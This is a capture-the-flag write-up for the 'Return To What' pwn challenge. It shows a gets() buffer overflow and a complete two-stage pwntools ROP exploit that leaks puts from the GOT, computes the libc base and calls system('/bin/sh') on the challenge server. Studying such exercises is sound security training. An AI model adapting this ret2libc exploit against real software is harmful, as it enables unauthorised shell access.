# Return To What

If you have not already, follow us on Twitter for updates and content! [@RagnarSecurity](https://twitter.com/ragnarsecurity)

This was a medium level difficulty PWN challenge. We were only given a binary and it involved ROP and 
ret2gotc. 

The first thing to do is perform a checksec. 

```bash
$ checksec return-to-what
[*] '/home/mwittner/Documents/ctf-writeups/downunder-ctf/pwn/return-to-what/return-to-what'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
mwittner@ubuntu:[~/Documents/ctf-writeu
```
As we can tell, there is nothing particular special about this binary in terms of security flags.

Standard input seemed pretty standard. Looked for some input, and then exited. 

```
WittsEnd2@ubuntu:[~/Documents/ctf-writeups/downunder-ctf/pwn/return-to-what]
$ ./return-to-what 
Today, we'll have a lesson in returns.
Where would you like to return to?
hello
WittsEnd2@ubuntu:[~/Documents/ctf-writeups/downunder-ctf/pwn/return-to-what]
$ 
```

```c
// This is from Ghidra
undefined8 main(void)

{
  puts("Today, we\'ll have a lesson in returns.");
  vuln();
  return 0;
}

```
```c 
void vuln(void)

{
  char local_38 [48];
  
  puts("Where would you like to return to?");
  gets(local_38);
  return;
}
```
Next I examined the program in Ghidra to determine whether there were any interesting functions to use. There was no `/bin/sh` in the binary nor a call so system. There were calls to puts; thus, it looked like the only avenue of attack. 



The steps that I did to craft the exploit were as followed 

1. I leaked the address of puts in libc relative to the binary. 
2. I calculated the base address of libc by taking the leaked address and subtracting it by the offset of puts relative to the base. 
3. I found a `/bin/sh` in the libc.
4. Call `execv('/bin/sh',0 ,0)` and SHELL!

There was just one major problems... <b>We needed the correct version of libc.</b>

After doing some research, I eventually asked the challenge author and she gave me a helpful tool: [https://libc.blukat.me/](https://libc.blukat.me/). **KEEPT THIS BOOK MAKRED!** It is impossible to find by Googling (or I searched the wrong thing).

How this resource worked is I took the last three hex values of the `leaked puts address`, and then it came back with the correct libc. 

Final exploit: 

```py
from pwn import *

context(os='linux', arch='amd64') 

# p = process('./return-to-what')
p = remote('chal.duc.tf', 30003)
binary = ELF('./return-to-what')
rop = ROP(binary)
libc = ELF('./libc6_2.27-3ubuntu1_amd64.so')

junk = b'A'*56

rop.puts(binary.got['puts'])
rop.call(binary.symbols['vuln'])

log.info("Stage  1 ROP chain:\n" + str(rop.dump()))

stage1 = junk + rop.chain()

p.recvuntil('Where would you like to return to?')
p.sendline(stage1)
p.recvline()

leaked_puts = p.recvline()[:8].strip().ljust(8,b'\x00')
log.success ("Leaked puts@GLIBC: " + str(leaked_puts))
leaked_puts=u64(leaked_puts)

libc.address = leaked_puts - libc.symbols['puts']


rop2 = ROP(libc)
rop2.system(next(libc.search(b'/bin/sh\x00')), 0, 0)

# rop2 = ROP(binary)
# rop2.call(libc.symbols['system'], (next(libc.search(b'/bin/sh\x00')), ))


log.info("Stage II ROP Chain: \n" + rop2.dump())
stageII = junk + rop2.chain()
p.recvuntil('Where would you like to return to?')
p.sendline(stageII)
p.recvline()
p.interactive()
```
